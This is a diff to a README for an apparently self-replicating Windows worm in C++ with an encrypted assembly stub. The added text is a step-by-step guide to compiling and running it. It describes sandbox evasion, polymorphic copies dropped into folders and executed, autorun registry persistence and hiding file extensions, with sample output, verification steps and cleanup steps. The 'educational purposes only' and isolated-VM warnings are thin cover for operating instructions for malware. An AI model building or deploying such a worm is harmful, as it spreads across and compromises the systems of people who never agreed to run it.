@@ -62,19 +62,189 @@ g++ src/main.cpp -o worm.exe -std=c++17 -lstdc++fs
 cl src/main.cpp /EHsc /std:c++17 /Fe:worm.exe
 ```
 
-## Usage
+## How to Use (Step-by-Step Guide)
 
-### Basic Usage
+### **Quick Start (3 Steps)**
+
+#### **Step 1: Compile the Assembly Stub**
 ```bash
-# Run all features (scan, hide extensions, add to autorun)
+# Download and install NASM (Netwide Assembler)
+# Then compile the decryption stub:
+nasm -f bin stub.asm -o stub.exe
+```
+
+#### **Step 2: Compile the C++ Worm**
+```bash
+# Using MinGW (recommended for Windows)
+g++ src/main.cpp -o worm.exe -std=c++17 -lstdc++fs
+
+# Alternative: Using Microsoft Visual C++
+cl src/main.cpp /EHsc /std=c++17 /Fe:worm.exe
+```
+
+#### **Step 3: Run the Worm**
+```bash
+# Basic execution (starts scanning and spreading)
 ./worm.exe
 
-# Verbose output
+# Verbose mode (shows detailed logging)
 ./worm.exe --verbose
 ```
 
-### Command Line Options
-- `--verbose`: Enable detailed logging
+### **What Happens When You Run It**
+
+#### **Initial Execution:**
+```
+AI Self-Replicating Worm (C++ Advanced)
+Full-Featured Malware Implementation
+WARNING: For educational purposes only
+
+[*] Performing environmental analysis...
+[+] Starting worm execution...
+[*] Starting directory scan...
+```
+
+#### **During Operation:**
+- **Sandbox Detection**: Checks system resources (RAM > 2GB, CPU cores > 1)
+- **Self-Reading**: Dynamically reads its own binary using `GetModuleFileNameA()`
+- **Directory Scanning**: Recursively scans directories, counts files
+- **AI Decision Making**: Spreads to directories with > 5 files
+- **Polymorphic Creation**: Creates `worm_NNNN.exe` files with unique encryption
+
+#### **Sample Output:**
+```
+[*] Performing environmental analysis...
+[*] Starting directory scan...
+[SCAN] Documents (12 files)
+[+] Dropped functional self-decrypting executable to: C:\Users\...\Documents\worm_1847.exe
+[+] Architecture: Stub(512 bytes) + Payload(45056 bytes encrypted)
+[+] Spawned process PID: 8473 (Stub will decrypt and execute payload)
+```
+
+### **Testing in Safe Environment**
+
+#### **Recommended Test Setup:**
+1. **Virtual Machine**: Use VMware/VirtualBox with Windows
+2. **Isolated Network**: No internet connection during testing
+3. **Backup Important Files**: Test directory with non-critical files
+4. **Monitoring Tools**: Process Explorer, Registry Monitor
+
+#### **Safe Testing Commands:**
+```bash
+# Create test directory with some files
+mkdir C:\TestWorm
+echo "test file 1" > C:\TestWorm\file1.txt
+echo "test file 2" > C:\TestWorm\file2.txt
+# ... create more files
+
+# Run worm in test directory
+cd C:\TestWorm
+/path/to/worm.exe --verbose
+```
+
+### **Expected Behavior**
+
+#### **Normal Operation:**
+- Creates multiple `worm_*.exe` files in directories with >5 files
+- Each copy has unique encryption (different file sizes/hashes)
+- Attempts to execute spawned copies
+- Modifies registry for persistence (autorun + extension hiding)
+
+#### **In Sandbox/Analysis Environment:**
+- Detects low resources (<2GB RAM or 1 CPU core)
+- Terminates early with message: `[-] Sandbox detected. Exiting.`
+
+### **Verification Commands**
+
+#### **Check Created Files:**
+```bash
+# List worm files
+dir /s worm_*.exe
+
+# Check file properties (different sizes due to unique encryption)
+for %f in (worm_*.exe) do @echo %f & fsutil file queryfilesize %f
+```
+
+#### **Check Registry Changes:**
+```bash
+# Check autorun (requires admin)
+reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+
+# Check extension hiding
+reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v HideFileExt
+```
+
+#### **Monitor Processes:**
+```bash
+# Watch for worm processes
+tasklist | findstr worm
+```
+
+### **Troubleshooting**
+
+#### **Common Issues:**
+
+**"stub.exe not found"**
+```bash
+# Make sure stub.exe is in the same directory as worm.exe
+dir stub.exe
+# If missing, recompile:
+nasm -f bin stub.asm -o stub.exe
+```
+
+**"Cannot read own binary"**
+- Run as administrator or check file permissions
+- Ensure executable isn't already running
+
+**"Scan error"**
+- Some directories may be inaccessible (system directories are skipped)
+- Check if running in sandbox/low-resource environment
+
+**No files created**
+- Check if current directory has subdirectories with >5 files
+- Use `--verbose` to see scanning decisions
+
+### **Advanced Usage**
+
+#### **Custom Compilation:**
+```bash
+# Optimized release build
+g++ src/main.cpp -o worm.exe -std=c++17 -lstdc++fs -O3 -s
+
+# Debug build with symbols
+g++ src/main.cpp -o worm_debug.exe -std=c++17 -lstdc++fs -g
+```
+
+#### **Analysis Mode:**
+```bash
+# Run in verbose mode to understand AI decisions
+./worm.exe --verbose > worm_log.txt
+# Analyze the log to see spreading patterns
+```
+
+### **Safety Precautions**
+
+#### **⚠️ Critical Warnings:**
+- **Never run on production systems**
+- **Always use isolated virtual machines**
+- **Backup important data before testing**
+- **Monitor system behavior closely**
+- **Have cleanup procedures ready**
+
+#### **Cleanup Commands:**
+```bash
+# Remove created worm files
+del /s worm_*.exe
+
+# Reset registry (autorun)
+reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v SelfReplicatingWorm /f
+
+# Reset extension hiding
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v HideFileExt /t REG_DWORD /d 0 /f
+```
+
+### **Command Line Options**
+- `--verbose`: Enable detailed logging of scanning and creation process
 
 ## Technical Details
 
